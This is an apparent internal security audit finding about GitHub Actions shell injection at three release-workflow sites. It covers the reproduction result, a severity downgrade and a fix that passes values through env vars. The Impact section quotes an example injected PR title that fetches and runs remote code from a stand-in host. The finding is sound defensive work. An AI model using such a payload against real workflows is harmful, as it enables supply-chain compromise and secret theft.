# High · H-2 · GitHub Actions `run:` shell-injection (3 sites)

- **Status:** Open · **Static-only** (severity reduced to Medium in practice)
- **Severity:** High
- **CWE:** CWE-78
- **Found by:** Semgrep (`yaml.github-actions.security.run-shell-injection`)
- **Detected:** 2026-05-18
- **Location(s):**
  - `.github/workflows/release-smoke.yml:65`
  - `.github/workflows/release.yml:198`
  - `.github/workflows/release.yml:247`

## Summary

`${{ github.* }}` data — branch names, PR titles, tag names — is
interpolated directly into shell scripts.

## Impact

A PR titled `"; curl evil | sh #` runs in the runner with `GITHUB_TOKEN`
and whatever job-level secrets are configured. `release.yml` has publish
permissions and access to npm credentials — this is a direct supply-chain
compromise vector.

## Reproduction

### Result: **Static-only** (severity caveat)

All three flagged sites interpolate `${{ inputs.* }}` from a `workflow_dispatch` trigger:

- `.github/workflows/release-smoke.yml:65` — `inputs.host_port`, `inputs.paperclip_version`
- `.github/workflows/release.yml:198` — `inputs.stable_date`
- `.github/workflows/release.yml:247` — `inputs.stable_date`

`workflow_dispatch` inputs are maintainer-controlled, so the realistic exploitation requires a
maintainer typo or an attacker who already has `workflow_dispatch` permissions. Semgrep is
correct to flag the pattern (it's brittle and would become critical if the same form were used in
a `pull_request_target` workflow tomorrow), but the real-world severity for these three sites is
closer to **Medium**.

Fix as suggested in the umbrella report — pass through env vars and quote in the shell.

## Fix

Pass through env vars and quote in shell:
```yaml
env:
  BRANCH: ${{ github.head_ref }}
run: |
  echo "$BRANCH"
```

## References

- Umbrella scan report: `report/security/2026-05-18-security-scan.md`
- Pen-test notes: `report/security/pentest/2026-05-18-pentest-notes.md`
